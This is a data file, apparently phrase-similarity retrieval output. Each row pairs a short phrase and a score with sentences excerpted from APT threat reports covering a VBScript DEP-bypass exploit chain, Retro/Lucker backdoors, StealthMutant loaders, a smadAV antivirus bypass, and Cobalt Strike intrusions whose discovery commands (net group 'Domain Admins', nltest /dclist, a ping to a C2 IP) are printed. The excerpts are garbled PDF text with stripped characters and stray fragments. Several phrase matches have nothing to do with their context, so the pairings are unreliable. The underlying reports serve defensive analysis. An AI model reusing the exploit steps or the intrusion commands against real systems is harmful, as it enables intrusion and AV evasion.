phrase|similarity|adjacent_sentences
the decryption algorithm|0.7618543230074822|['If the input argument is addr(0x11223344), first add 4 to the value to get 0x11223348, and then set the variant type to 8 (string type).', 'Next, call len function: if found to be BSTR type, vbscript will assume that the forward 4 bytes (0x11223344) is the address memory to store the length.', 'So the len function will be executed and the value of the specified memory address will be returned.', 'Obtain Key DLL Base Address 1.', 'The attacker leaks the virtual function table address of the CScriptEntryPoint object in the following way, which belongs to Vbscript.dll.', '1.', 'Obtain the vbscript.dll base address in the following way.', '1.', 'Because vbscript.dll imported msvcrt.dll, the msvcrt.dll base address was obtained by traversing the vbscript.dll import table, msvcrt.dll introduces kernelbase.dll, ntdll.dll, and finally the NtContinue, VirtualProtect function address was obtained.', 'Save web pages as PDF with PDFmyURLBypass DEP to execute shellcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then assign it with a value of 0 to make the virtual machine perform VAR:: Clear function.']
the decryption algorithm|0.791515393227727|['The set of Trojans is powerful, with keyboard recording, voice recording, screen capture, file capture and U disk operation functions, etc.', 'The Lucker s name comes from the PDB path of this type of Trojan, because most of the backdoors function use the LK abbreviation.In the middle to late period we have discovered its evolution and two different types of backdoor programs.', 'We have named them Retro and Collector by the PDB path extracted from the program.', 'The Retro backdoor is an evolution of the Lucker backdoor and it actives in a series of attacks from 2016 till now.', 'The name comes from the pdb path of this type of Trojan with the label Retro, and also has the word Retro in the initial installer.C:\\\\workspace\\\\Retro\\\\DLL-injected-explorer\\\\zlib1.pdbC:\\\\workspace\\\\Retro\\\\RetroDLL\\\\zlib1.pdbThe evolution of the reflective DLL injection technique can be found from the relevant PDB paths, and there are a lot of variants of this series of backdoors.VII Attribution1.', 'Decryption AlgorithmDuring the analysis, we found the decryption algorithm that malware used is identical to APT-C-06s decryption algorithm.The decryption algorithm of this attack is as follow:The decryption algorithm APT-C-06 used is as follow:In the further analysis, we found the same decryption algorithm was used in the 64-bit version of the relevant malware.2.', 'PDB PathThe PDB path of the malware used in this attack has a string of Retro.', 'It is one specific feature of Retro Trojan family.3.', 'VictimsIn the process of tracing victims, we found one special compromised machine.', 'It has a large amount of malware related to APT-C-06.', 'By looking at these samples in chronological order, the evolution of the malicious program can be clearly seen.']
to decrypt the payload|0.7732040203685518|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
decrypt it|0.9024083156629212|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
API obfuscation, and execution flow obfuscation|0.7884577806423791|['ESET Research White papers // July 2019 MACHETE JUST GOT SHARPER Venezuelan military under attack How spies managed to steal gigabytes of confidential data over the course of a yearTABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']
proxy|0.7552352780652003|['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we https://securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the common jab PCAP or attacks-in-2015/.', 'GTFO), could it not be a backdoored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not need an understanding of the https://www.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realistically, there will never simultaneous_di.html.', 'be a solid enough attribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']
Windows API|0.7903233347120202|['ESET Research Whitepapers // August 2018 TURL A OUTLOOK BACKDOOR Analysis of an unusual Turla backdoor2 Turla Outlook Backdoor // Analysis of an unusual Turla backdoor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']
Windows API|0.7903233347120202|"[': //http://localhost:3699/api/GetSources?Type=3&start=1532620329&end=1532620329 : [ { ""Type"": 3, ""IP"": """", 23""Mac"": """", ""Name"": "" Scotland Redmoss 1,9km"", ""StationNumber"": """", ""Time"": 1532563200000, ""GeoX"": 57.13, ""GeoY"": -2.12, ""Extras"": ""Vsat "" }, { ""Type"": 3, ""IP"": """", ""Mac"": """", ""Name"": ""iDirect HUB iNFINITI"", ""StationNumber"": """", ""Time"": 1538572327000, ""GeoX"": 55.784,""GeoY"": 37.486, ""Extras"": ""-NSS 7; -Ku-3 Norsat; -Vertical; -12558014279; vsat_-iDirect HUB iNFINITI; _-1538572327; - 55,784|37,486; - Moscow Oblast Khoroshevo-Mnevniki (159000) 0,9km"" }, ... ]   1.   : {ip}:9850/api/GetState : [ { ""Id"": 1, ""Name"": """", ""Status"": ""Ok"", ""Message"": "" .', ': 478"" },... ]  1.   id : {ip}:9850/api/KeyWords/{id} //GET : id  .', ': //http://localhost:3699/api/KeyWords/1 [ { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [""*"",""Sergy*"",""356"",""Test rub 358999"",""Last Add rub 66""] }, 24{ ""ID"": 1, ""Language"": ""CA"", ""KeyWords"": [""ARRAMBADA"",""BANDARRA"",""BARRINAR"",""BOLLERA"",""BOLLICAO"",""CAGANER"", ""CARDAR"",""CASCAR&SE&LA"",""COLLONS"",""CONSOLADOR"",""CONY"",""CUL"",""ESCALFAPOLLES"",""FAR RANACO"",""FER&UN&RIU"", ""FIGA"",""FILL&DE&PUTA"",""FILL&DE&VERRA"",""FOLLADOR"",""FOLLAR"",""FURNICAR"",""GALLUMBOS"","" GILIPOLLES"",""HINYAR "",""LLEPAR"",""LLETERADA"",""MAMADA"",""MANOLA"",""MARIETA"",""MARIPILI"",""PAJARITO"",""PARRS"",""P ELAR&SE&LA"",""PUT A"",""PUTOT"",""TREMPERA"",""TXITX*"",""XONA"",""XUFA""] }, { ""ID"": 1, ""Language"": ""CS"", ""KeyWords"": [""BUZERANT"",""CHUJ"",""HOVNO"",""KOULE"",""KUNDA"",""KURVA"",""PRDEL"",""VEJCE"",""ZMRD""] },... ] 2.   id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 358999"", ""Last Add rub 667"" ] }   1.  : {ip}:9850/api/rubriclist?Parent=-1 //  {ip}:9850/api/rubriclist?Parent=20 //  Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": null, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25},... ] : Url=""/json/rubrics/5 2.  : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""AA"", ""Name"": ""AA-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },... ] API     .', '.', ',     .', '.', '-    .', '26      -     ,    (),  (),   ().', '-  .']"
Windows API|0.7903233347120202|['19 Corelan Team.', 'Starting to write Immunity Debugger PyCommands : my cheatsheet.', 'January 2010.', '10 www.fireeye.comPoison Ivy: Assessing Damage and Extracting Intelligence Defenders View Attackers View Starting ChopShop Initializing Modules ... Initializing module poisonivy_23x Transferred files will be saved.. Screen/Cam/Audio/Key captures will be saved.. Running Modules ... [2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]*** Host Information*** PI profile ID: mal IP address: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 2600 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] *** Shell Session *** Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\\\> [2013-07-03 06:46:42 PDT] *** Shell Session *** ipconfig [2013-07-03 06:46:43 PDT] *** Shell Session *** Windows IP Configuration Connection-specific DNS Suffix .', ': IP Address.', '.', '.', '.', '.', '.', '.']
Windows API|0.7903233347120202|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
Windows API|0.7903233347120202|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
C:\Windows\System32\cmd.exe /c|0.7619432530726247|"['Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.', 'In this case it is the number 11985756.Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.', 'After many iterations, the script would deobfuscate and run-in memory.', 'The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.', ']32 for further instructions.Credential AccessThe only credential access observed was through Zerologon, which was used to retrieve the domain administrators NTLM hash.DiscoveryDiscovery started with a port scan initiated by the Hancitor dll.After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.', 'The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.C:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group""Domain Admins""/domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping190.114.254.116C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainNotice above, the threat actors pinged 190.114.254[.', ']116 which is one of the Cobalt Strike servers they later used.The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.', 'This script used the Active Directory RSAT module to get a list of computers and place them in a file named comps.txt.A program named check.exe was observed using the comps.txt text file.', 'This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.', 'The online hosts will then be directed to the check.txt text file.The check.exe file contains three parameters that can be used one at a time:check.exe comps.txtcheck.txt -ip (Checkwhichhostsincomps.txtarealive,andwrite the IPtocheck.txt)check.exe comps.txtcheck.txt -name(Checkwhichhostsincomps.txtarealive,andwrite the hostnametocheck.txt)check.exe comps.txtcheck.txt -full(Checkwhichhostsincomps.txtarealive,andwrite the IPandhostnametocheck.txt)Lateral MovementThe threat actors pivoted towards multiple hosts on the domain from the beachhead.', 'The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).']"
C:\Windows\System32\cmd.exe /c|0.8012749828240929|"['The batch scripts came from the first revision ofRevisions quick-disable-windows-defender.bat GitHub, which was used by the ransomware operators without making any changes.Masquerading Example (reference)Obfuscation Example (reference)DiscoveryOnce access is established, threat actors then need to enumerate the victim environment.', 'Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and theAdFindtool.', 'In a few cases, adversaries attempted to get a listing of open ports/running services on remote hosts by performing port scans using tools such as Advanced IP Scanner and KPortScan 3.0.The first thing we observe from hands-on keyboard operators is usually additional discovery activity.', 'We see threat actors concentrate on searching for the Domain Controllers and general environmental information.The statistics below illustrate the most used Windows tools for enumerating the environment.', 'We compare each tool to the total percent of cases investigated.We see the enumeration commands executed in a short time span, between 1-5 seconds.', 'The execution is usually done through post-exploitation frameworks (Cobalt Strike in most cases).Example screenshot is taken from the case:From Zero to Domain AdminC:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group ""Domain Admins"" /domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping 190.114.254.116  C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainLateral MovementLateral movement is a vital component of threat actor TTPs.', 'Once they get the lay of the land through the discovery methods we outlined above, we repeatedly see them move laterally across the network.', 'Domain Controllers, file shares and similarly high-value servers are primary targets.The number one post-exploitation framework of choice, Cobalt Strike, allows threat actors to leverage different techniques for the purpose of lateral movement.Other common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.', '(updated 3/7/22 @ 1330 UTC)WMIC Lateral Movement Example (reference)Psexec Example (reference)Command and ControlOne common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities.', 'In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.For an in-depth breakdown of some of the network operations of Cobalt Strike see ourrecent report on the topic.ExfiltrationWhile exfiltration of data was not a common sight in our data set, we observed exfil in 6 of the 20 cases.', 'In the cases where data exfiltration was observed, the threat actors used tools such as RClone, FileZilla, or WinSCP to transfer the data to their controlled servers.']"
calling the RegisterClass function prior to calling CreateWindow.|0.758028220582889|['This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.', 'The threat actors appear to have reverse-engineered the logic of smadAV and dealt with this check by creating a window without a window name, but with the class name EDIT which is one of the available default windows class names.', 'The window attributes include a very large number for the X position, the width and height are set to 0, and flags such as WS_EX_TOOLWINDOW define the window as a tool window.', 'These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: Figure 2 A piece of malware code creates a specially crafted window to bypass the smadAV.', 'Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.', 'But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.', 'Ultimately, creating this window allows the threat actors to bypass the check, as the newly created window is technically visible, and continue the backdoor execution uninterrupted.', 'Figure 3 SmadAV detection on the Go backdoor with the removed bypassSMADAV function.', 'Backdoor execution flow The malware creates a mutex named NASA&USA and then continues execution according to one of two modes of operation.', '3/6First mode: persistence, PowerShell backdoor, and malware installation The malware checks if there is a zip string in the file path.', 'If this is not found, it continues the execution flow.']
Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.|1.0|['If none is found, meaning the new process doesnt have any visible windows, the antivirus deems the newly created process to be malicious and shows a popup that suggests blocking the created process.', 'This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.', 'The threat actors appear to have reverse-engineered the logic of smadAV and dealt with this check by creating a window without a window name, but with the class name EDIT which is one of the available default windows class names.', 'The window attributes include a very large number for the X position, the width and height are set to 0, and flags such as WS_EX_TOOLWINDOW define the window as a tool window.', 'These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: Figure 2 A piece of malware code creates a specially crafted window to bypass the smadAV.', 'Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.', 'But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.', 'Ultimately, creating this window allows the threat actors to bypass the check, as the newly created window is technically visible, and continue the backdoor execution uninterrupted.', 'Figure 3 SmadAV detection on the Go backdoor with the removed bypassSMADAV function.', 'Backdoor execution flow The malware creates a mutex named NASA&USA and then continues execution according to one of two modes of operation.', '3/6First mode: persistence, PowerShell backdoor, and malware installation The malware checks if there is a zip string in the file path.']
